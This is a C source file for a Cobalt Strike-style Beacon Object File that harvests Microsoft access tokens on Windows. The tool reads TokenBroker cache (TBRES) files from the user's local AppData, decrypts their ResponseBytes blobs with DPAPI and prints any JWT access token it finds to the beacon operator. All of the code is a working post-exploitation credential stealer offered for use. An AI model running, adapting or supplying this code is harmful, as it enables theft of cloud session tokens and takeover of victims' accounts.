#include <windows.h>
#include "base.c"
#include "bofdefs.h"

char* extractResponseBytesValue(const char* json) {
    char* resp_bytes_pos = MSVCRT$strstr(json, "\"ResponseBytes\"");
    if (!resp_bytes_pos) return NULL;
    
    char* value_pos = MSVCRT$strstr(resp_bytes_pos, "\"Value\":");
    if (!value_pos) return NULL;
    
    value_pos += 8;
    while (*value_pos == ' ' || *value_pos == '\t' || *value_pos == '\n' || *value_pos == '\r') {
        value_pos++;
    }
    
    if (*value_pos != '"') return NULL;
    value_pos++;
    
    char* end_quote = MSVCRT$strchr(value_pos, '"');
    if (!end_quote) return NULL;
    
    int len = end_quote - value_pos;
    if (len <= 0) return NULL;
    
    char* result = (char*)MSVCRT$malloc(len + 1);
    if (!result) return NULL;
    
    memcpy(result, value_pos, len);
    result[len] = '\0';
    
    return result;
}

char* extractKeyValue(const char* json, const char* key) {
    char search_pattern[256];
    MSVCRT$_snprintf(search_pattern, sizeof(search_pattern), "\"%s\":", key);
    
    char* key_pos = MSVCRT$strstr(json, search_pattern);
    if (!key_pos) return NULL;
    
    key_pos += MSVCRT$strlen(search_pattern);
    while (*key_pos == ' ' || *key_pos == '\t' || *key_pos == '\n' || *key_pos == '\r') {
        key_pos++;
    }
    
    if (*key_pos != '"') return NULL;
    key_pos++;
    
    char* end_quote = MSVCRT$strchr(key_pos, '"');
    if (!end_quote) return NULL;
    
    int len = end_quote - key_pos;
    if (len <= 0) return NULL;
    
    char* result = (char*)MSVCRT$malloc(len + 1);
    if (!result) return NULL;
    
    memcpy(result, key_pos, len);
    result[len] = '\0';
    
    return result;
}

int base64_decode_len(char* input) {
    int len = MSVCRT$strlen(input);
    int padding = 0;
    if (len > 0 && input[len-1] == '=') padding++;
    if (len > 1 && input[len-2] == '=') padding++;
    return (len * 3) / 4 - padding;
}

int base64_decode(char* input, unsigned char* output) {
    const char* chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    int len = MSVCRT$strlen(input);
    int out_len = 0;
    
    for (int i = 0; i < len; i += 4) {
        int a = -1, b = -1, c = -1, d = -1;
        
        for (int j = 0; j < 64; j++) {
            if (input[i] == chars[j]) a = j;
            if (i+1 < len && input[i+1] == chars[j]) b = j;
            if (i+2 < len && input[i+2] == chars[j]) c = j;
            if (i+3 < len && input[i+3] == chars[j]) d = j;
        }
        
        if (a == -1 || b == -1) break;
        
        output[out_len++] = (a << 2) | (b >> 4);
        if (c != -1 && input[i+2] != '=') {
            output[out_len++] = (b << 4) | (c >> 2);
        }
        if (d != -1 && input[i+3] != '=') {
            output[out_len++] = (c << 6) | d;
        }
    }
    
    return out_len;
}

void find_jwt_token(BYTE *data, DWORD len) {
    if (!data || len == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] No data to search");
        return;
    }
    
    for (DWORD i = 0; i <= len - 4; i++) {
        if (data[i] == 'e' && data[i+1] == 'y' && data[i+2] == 'J' && data[i+3] == '0') {
            
            DWORD token_start = i;
            DWORD token_end = i;
            DWORD dot_count = 0;
            
            while (token_end < len) {
                BYTE b = data[token_end];
                
                if ((b >= 'A' && b <= 'Z') || (b >= 'a' && b <= 'z') || 
                    (b >= '0' && b <= '9') || b == '+' || b == '/' || 
                    b == '=' || b == '-' || b == '_') {
                    token_end++;
                } else if (b == '.') {
                    dot_count++;
                    token_end++;
                } else {
                    break;
                }
            }
            
            DWORD final_length = token_end - token_start;
            
            if (dot_count >= 2 && final_length > 100) {
                char* complete_token = (char*)MSVCRT$malloc(final_length + 1);
                if (complete_token) {
                    memcpy(complete_token, &data[token_start], final_length);
                    complete_token[final_length] = '\0';
                    
                    internal_printf("\n");
                    internal_printf("[!] ===== Found ACCESS TOKEN =====\n");
                    internal_printf("%s\n", complete_token);
                    internal_printf("[!] ===== END TOKEN =====");
                    internal_printf("\n");
                    
                    MSVCRT$free(complete_token);
                    return;
                }
            } else {
                BeaconPrintf(CALLBACK_ERROR, "[-] Invalid JWT structure (dots:%lu, len:%lu)", dot_count, final_length);
            }

            i = token_end > token_start ? token_end - 1 : i;
        }
    }
}

char* dpapi_decrypt_blob(char* base64_encrypted_data) {
    if (!base64_encrypted_data || MSVCRT$strlen(base64_encrypted_data) == 0) {
        return NULL;
    }
    
    int encrypted_len = base64_decode_len(base64_encrypted_data);
    if (encrypted_len <= 0) {
        return NULL;
    }
    
    unsigned char* encrypted_data = (unsigned char*)MSVCRT$malloc(encrypted_len);
    if (!encrypted_data) {
        return NULL;
    }
    
    int actual_len = base64_decode(base64_encrypted_data, encrypted_data);
    if (actual_len <= 0) {
        MSVCRT$free(encrypted_data);
        return NULL;
    }

    DATA_BLOB encrypted_blob;
    DATA_BLOB decrypted_blob;
    
    encrypted_blob.pbData = encrypted_data;
    encrypted_blob.cbData = actual_len;
    
   MSVCRT$memset(&decrypted_blob, 0, sizeof(decrypted_blob));
    
    BOOL result =Crypt32$CryptUnprotectData(
        &encrypted_blob,
        NULL,
        NULL,
        NULL,
        NULL,
        0,
        &decrypted_blob
    );
    
    MSVCRT$free(encrypted_data);

    find_jwt_token(decrypted_blob.pbData, decrypted_blob.cbData);

    if (!result) {
        DWORD error = KERNEL32$GetLastError();
        BeaconPrintf(CALLBACK_ERROR, "[-] DPAPI decryption failed. Error: %lu", error);
        return NULL;
    }
    
    if (decrypted_blob.cbData == 0 || !decrypted_blob.pbData) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Decryption returned empty data");
        return NULL;
    }

    char* result_buffer = (char*)MSVCRT$malloc(decrypted_blob.cbData + 1);
    if (!result_buffer) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Memory allocation failed for result");
        KERNEL32$LocalFree(decrypted_blob.pbData);
        return NULL;
    }
    
    memcpy(result_buffer, decrypted_blob.pbData, decrypted_blob.cbData);
    result_buffer[decrypted_blob.cbData] = '\0';
    
    KERNEL32$LocalFree(decrypted_blob.pbData);
    
    return result_buffer;
}

char* readFileUTF16(char* path)
{
    HANDLE hFile = KERNEL32$CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error opening file: %s", path);
        return (char*)EXIT_FAILURE;
    }
    
    DWORD file_size = KERNEL32$GetFileSize(hFile, NULL);
    if (file_size == INVALID_FILE_SIZE || file_size == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Invalid file size");
        KERNEL32$CloseHandle(hFile);
        return (char*)EXIT_FAILURE;
    }
    
    BYTE* raw_buffer = (BYTE*)MSVCRT$malloc(file_size);
    if (!raw_buffer) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Memory allocation failed");
        KERNEL32$CloseHandle(hFile);
        return (char*)EXIT_FAILURE;
    }
    
    DWORD bytes_read = 0;
    if (!KERNEL32$ReadFile(hFile, raw_buffer, file_size, &bytes_read, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Error reading file");
        MSVCRT$free(raw_buffer);
        KERNEL32$CloseHandle(hFile);
        return (char*)EXIT_FAILURE;
    }
    KERNEL32$CloseHandle(hFile);
    
    BOOL is_utf16 = TRUE;
    for (DWORD i = 1; i < bytes_read && i < 20; i += 2) {
        if (raw_buffer[i] != 0x00) {
            is_utf16 = FALSE;
            break;
        }
    }
    
    if (is_utf16) {
        DWORD char_count = file_size / 2;
        char* ascii_buffer = (char*)MSVCRT$malloc(char_count + 1);
        if (!ascii_buffer) {
            MSVCRT$free(raw_buffer);
            return (char*)EXIT_FAILURE;
        }
        
        for (DWORD i = 0; i < char_count; i++) {
            ascii_buffer[i] = (char)raw_buffer[i * 2];
        }
        ascii_buffer[char_count] = '\0';
        
        MSVCRT$free(raw_buffer);
        return ascii_buffer;
    } else {
        raw_buffer[bytes_read] = '\0';
        return (char*)raw_buffer;
    }
}

int listFiles(char* path)
{
    WIN32_FIND_DATA data;
    DWORD dwError;

    char szDir[MAX_PATH];
    MSVCRT$strcpy(szDir, path);
    MSVCRT$strcat(szDir, "\\*");

    HANDLE hFind = KERNEL32$FindFirstFileA(szDir, &data);

    if (hFind != INVALID_HANDLE_VALUE){
        do {          
            if (strcmp(data.cFileName, ".") != 0 && MSVCRT$strcmp(data.cFileName, "..") != 0)
            {
                internal_printf("\n[+] Found TBRES File: %s%s\n", path, data.cFileName);
                char subDir[MAX_PATH];
                MSVCRT$strcpy(subDir, path);
                MSVCRT$strcat(subDir, data.cFileName);
                char *buffer = readFileUTF16(subDir);
                if (buffer == (char*)EXIT_FAILURE) {
                    BeaconPrintf(CALLBACK_ERROR, "Failed to read file!\n");
                    return EXIT_FAILURE;
                }
                char *result = extractResponseBytesValue(buffer);
                char *decrypted = dpapi_decrypt_blob(result);                
            }
        } while (KERNEL32$FindNextFileA(hFind, &data));

        dwError = KERNEL32$GetLastError();
        if (dwError != ERROR_NO_MORE_FILES) {
            BeaconPrintf(CALLBACK_ERROR, "Error searching for next file: %d\n", dwError);
        }
        
        KERNEL32$FindClose(hFind);
    }
    return EXIT_SUCCESS;
}

void WAMBAM()
{
    char path[MAX_PATH];

    if (SUCCEEDED(SHELL32$SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, path)))
    {
        MSVCRT$strcat(path, "\\Microsoft\\TokenBroker\\Cache\\");
        listFiles(path);
    }
}

#ifdef BOF

void go(char *args, int argLen)
{
    datap parser;
    
    BeaconDataParse(&parser, args, argLen);
    char* first_arg = BeaconDataExtract(&parser, NULL);
    char* second_arg = BeaconDataExtract(&parser, NULL); 
    char* third_arg = BeaconDataExtract(&parser, NULL); 
 
    if(!bofstart())
	{
		return;
	}

	WAMBAM();
    printoutput(TRUE);
};

#else

int main() {
    BeaconPrintf(CALLBACK_OUTPUT, "====================== Locating TBRES FILE ======================\n\n");
    WAMBAM();
}

#endif